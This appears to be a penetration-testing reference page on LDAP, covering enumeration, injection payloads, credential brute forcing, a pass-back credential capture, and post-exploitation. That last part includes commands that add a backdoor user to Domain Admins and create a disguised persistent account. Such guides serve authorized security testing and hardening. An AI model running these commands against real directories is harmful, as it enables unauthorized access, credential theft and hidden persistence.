# LDAP

**`Default Ports: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)`**

**Lightweight Directory Access Protocol (LDAP)** is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an IP network. LDAP is commonly used for user authentication, authorization, and storing organizational information. Microsoft's Active Directory is built on LDAP. LDAP directories store information hierarchically in a tree structure.

### Connect <a href="#connect" id="connect"></a>

#### Using ldapsearch <a href="#using-ldapsearch" id="using-ldapsearch"></a>

Use ldapsearch for querying LDAP directories and extracting information.

**Basic LDAP Queries**

```
# Anonymous bind (no authentication)
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com"

# With credentials
ldapsearch -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# LDAPS (SSL/TLS)
ldapsearch -x -H ldaps://target.com:636 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

**Advanced LDAP Searches**

```
# Search specific object class
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=person)"

# Get all attributes
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "*"
```

#### Using ldapwhoami <a href="#using-ldapwhoami" id="using-ldapwhoami"></a>

Use ldapwhoami to test LDAP authentication and identify current user context.

```
# Test authentication
ldapwhoami -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password

# Anonymous bind
ldapwhoami -x -H ldap://target.com
```

#### Using ldapadd/ldapmodify <a href="#using-ldapaddldapmodify" id="using-ldapaddldapmodify"></a>

Use LDAP modification tools to add, modify, and delete directory entries.

```
# Add new entry
ldapadd -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -f new_entry.ldif

# Modify entry
ldapmodify -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -f modify.ldif

# Delete entry
ldapdelete -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password "cn=user,ou=users,dc=example,dc=com"
```

#### Using Python (ldap3) <a href="#using-python-ldap3" id="using-python-ldap3"></a>

Use Python ldap3 library for programmatic LDAP access and automation.

```
from ldap3 import Server, Connection, ALL

server = Server('target.com', get_info=ALL)
conn = Connection(server, 'cn=admin,dc=example,dc=com', 'password', auto_bind=True)

# Search
conn.search('dc=example,dc=com', '(objectClass=person)')
for entry in conn.entries:
    print(entry)

conn.unbind()
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect LDAP services and identify server capabilities.

```
nmap -p 389,636,3268 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Identify LDAP server software and version through banner grabbing.

**Using netcat**

```
# Using netcat
nc -vn target.com 389
```

**Using nmap**

```
# Using nmap
nmap -p 389 -sV --script ldap-rootdse target.com
```

**Using ldapsearch**

```
# Get root DSE
ldapsearch -x -H ldap://target.com -b "" -s base "(objectclass=*)"
```

#### Rootdse Information <a href="#rootdse-information" id="rootdse-information"></a>

Extract detailed server information from LDAP root DSE.

**Basic Root DSE Queries**

```
# Get naming contexts
ldapsearch -x -H ldap://target.com -b "" -s base "(objectclass=*)" namingContexts

# Get all rootDSE attributes
ldapsearch -x -H ldap://target.com -b "" -s base "(objectclass=*)" "*" "+"
```

**Important Root DSE Attributes**

```
# Important attributes to check:
# - namingContexts (base DNs)
# - defaultNamingContext (primary domain)
# - supportedLDAPVersion
# - supportedSASLMechanisms
# - dnsHostName
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Domain Information <a href="#domain-information" id="domain-information"></a>

Querying domain objects reveals organizational structure, forest information, and domain functional levels.

```
# Get domain info
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=domain)"

# Get naming contexts
ldapsearch -x -H ldap://target.com -b "" -s base namingContexts

# Forest information
ldapsearch -x -H ldap://target.com -b "" -s base forestFunctionality
```

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

LDAP directories contain detailed user information including email addresses, phone numbers, group memberships, and account status.

**Basic User Queries**

```
# List all users
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=person)"

# Users with specific attributes
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=user)" cn mail

# Active Directory users
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName
```

**Advanced User Queries**

```
# Users with passwords never expire
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=65536)"

# Service accounts
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(&(objectClass=user)(servicePrincipalName=*))"
```

#### Group Enumeration <a href="#group-enumeration" id="group-enumeration"></a>

Group information reveals organizational structure and helps identify privileged users like Domain Admins.

```
# List all groups
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=group)" cn

# Domain Admins
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=Domain Admins)" member

# All admin groups
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(&(objectClass=group)(cn=*admin*))" cn member

# Group members
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=Administrators)" member
```

#### Computer Enumeration <a href="#computer-enumeration" id="computer-enumeration"></a>

Enumerate computer objects and domain controllers in the LDAP directory.

```
# List computers
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=computer)" cn

# Domain controllers
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName

# Operating systems
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=computer)" operatingSystem operatingSystemVersion
```

#### Attribute Enumeration <a href="#attribute-enumeration" id="attribute-enumeration"></a>

Extract specific attributes that may contain sensitive information or useful data.

**Contact Information Extraction**

```
# Extract email addresses
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(mail=*)" mail

# Extract phone numbers
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(telephoneNumber=*)" telephoneNumber
```

**Sensitive Attribute Queries**

```
# User descriptions (may contain passwords)
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(description=*)" description

# Service Principal Names (SPNs)
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(servicePrincipalName=*)" servicePrincipalName
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Anonymous Bind <a href="#anonymous-bind" id="anonymous-bind"></a>

Anonymous bind allows unauthenticated access to LDAP directories, potentially exposing sensitive organizational information.

```
# Test anonymous access
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=*)"

# If successful, enumerate everything
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=user)"
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=group)"
```

#### Null Bind <a href="#null-bind" id="null-bind"></a>

Null bind attempts to authenticate with empty credentials, which may still reveal directory information.

```
# Bind with empty credentials
ldapsearch -x -H ldap://target.com -D "" -w "" -b "dc=example,dc=com"

# May reveal information even with null credentials
```

#### LDAP Injection <a href="#ldap-injection" id="ldap-injection"></a>

LDAP injection attacks manipulate LDAP queries to bypass authentication or extract unauthorized information.

**Basic Injection Payloads**

```
# In login forms using LDAP
# Normal query: (&(uid=username)(password=pass))

# Injection payloads
username: admin)(&(|
password: any

# Results in: (&(uid=admin)(&(|)(password=any))
# Always true condition
```

**Advanced Injection Techniques**

```
# Wildcard injection
username: *
password: *

# OR injection
username: *)(uid=*))(|(uid=*
password: any

# Comment injection
username: admin)(cn=*))%00
password: any
```

#### Brute Force <a href="#brute-force" id="brute-force"></a>

Brute forcing LDAP credentials can reveal weak passwords on directory services.

**Using Hydra**

```
hydra -L users.txt -P passwords.txt target.com ldap2 -s 389
```

**Using Nmap**

```
nmap -p 389 --script ldap-brute --script-args ldap.base='"dc=example,dc=com"' target.com
```

**Using Metasploit**

```
use auxiliary/scanner/ldap/ldap_login
set RHOSTS target.com
set USERNAME admin
set PASS_FILE passwords.txt
run
```

#### Pass-Back Attack <a href="#pass-back-attack" id="pass-back-attack"></a>

Pass-back attacks redirect LDAP authentication to attacker-controlled servers to capture credentials.

```
# If you can modify LDAP server settings
# Change LDAP server IP to attacker's server

# Setup rogue LDAP server
sudo responder -I eth0

# Or use simple LDAP logger
sudo nc -lvnp 389

# Device will send credentials to attacker's server
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Extract All Users <a href="#extract-all-users" id="extract-all-users"></a>

Extract comprehensive user information for analysis and further exploitation.

**Complete User Dump**

```
# Complete user dump with all attributes
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" \
  "(objectClass=user)" \
  "*" "+" > all_users.ldif

# Parse for passwords in description
grep -i "description:" all_users.ldif | grep -i "pass\|pwd"
```

**Targeted User Extraction**

```
# Extract specific attributes
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" \
  "(objectClass=user)" \
  sAMAccountName mail userAccountControl
```

#### Kerberoasting Targets <a href="#kerberoasting-targets" id="kerberoasting-targets"></a>

Identify service accounts with SPNs for Kerberoasting attacks.

```
# Find SPNs (Service Principal Names)
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Request service tickets
# Then crack offline with hashcat
```

#### ASREPRoasting Targets <a href="#asreproasting-targets" id="asreproasting-targets"></a>

Identify users vulnerable to ASREPRoasting attacks.

```
# Find users with "Do not require Kerberos preauthentication"
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

#### Sensitive Attribute Extraction <a href="#sensitive-attribute-extraction" id="sensitive-attribute-extraction"></a>

Search for sensitive information stored in user attributes.

**Password Hunting**

```
# Look for passwords in attributes
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" \
  "(description=*)" description | grep -i "pass\|pwd\|secret"
```

**Additional Attribute Searches**

```
# Check info field
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(info=*)" info

# Comment field
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(comment=*)" comment
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges by modifying group memberships and user permissions.

```
# Add user to admin group
cat > add_admin.ldif << EOF
dn: cn=Domain Admins,cn=Users,dc=example,dc=com
changetype: modify
add: member
member: cn=backdoor_user,cn=Users,dc=example,dc=com
EOF

ldapmodify -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -f add_admin.ldif
```

#### Persistence <a href="#persistence" id="persistence"></a>

Establish persistent access by creating backdoor accounts and maintaining access.

```
# Create backdoor user
cat > backdoor.ldif << EOF
dn: cn=System Service,cn=Users,dc=example,dc=com
changetype: add
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: System Service
sAMAccountName: svc_system
userPrincipalName: svc_system@example.com
userPassword: P@ssw0rd123!
EOF

ldapadd -x -H ldap://target.com \
  -D "cn=admin,dc=example,dc=com" -w password \
  -f backdoor.ldif

# Add to Domain Admins (as shown above)
```

### Common LDAP Queries <a href="#common-ldap-queries" id="common-ldap-queries"></a>

```
# All users
(objectClass=user)

# All groups
(objectClass=group)

# All computers
(objectClass=computer)

# Domain Admins
(cn=Domain Admins)

# Users with SPNs
(&(objectClass=user)(servicePrincipalName=*))

# Disabled accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Accounts that never expire
(userAccountControl:1.2.840.113556.1.4.803:=65536)

# Locked accounts
(lockoutTime>=1)
```

### LDAP Filter Examples <a href="#ldap-filter-examples" id="ldap-filter-examples"></a>

```
# AND operator
(&(objectClass=user)(cn=admin))

# OR operator  
(|(cn=admin)(cn=user))

# NOT operator
(!(cn=guest))

# Wildcard
(cn=admin*)
(cn=*admin*)

# Present
(mail=*)

# Greater than
(badPwdCount>=3)
```

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool                    | Description            | Primary Use Case     |
| ----------------------- | ---------------------- | -------------------- |
| ldapsearch              | LDAP search tool       | Querying LDAP        |
| ldapmodify              | LDAP modification tool | Modifying entries    |
| JXplorer                | LDAP GUI browser       | Visual exploration   |
| Apache Directory Studio | LDAP IDE               | Complete management  |
| ldapdomaindump          | AD info dumper         | Domain enumeration   |
| windapsearch            | AD enumeration         | PowerShell-less enum |
| enum4linux              | SMB/LDAP enumerator    | Linux-based enum     |
| Metasploit              | Exploitation framework | Automated testing    |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ Anonymous bind allowed
* ❌ Null bind permitted
* ❌ Weak admin passwords
* ❌ LDAP injection vulnerabilities
* ❌ No SSL/TLS (using port 389)
* ❌ Excessive permissions granted
* ❌ Sensitive data in attributes
* ❌ No access controls
* ❌ Verbose error messages
* ❌ Default configurations
* ❌ No logging enabled
* ❌ Outdated LDAP server

<br>
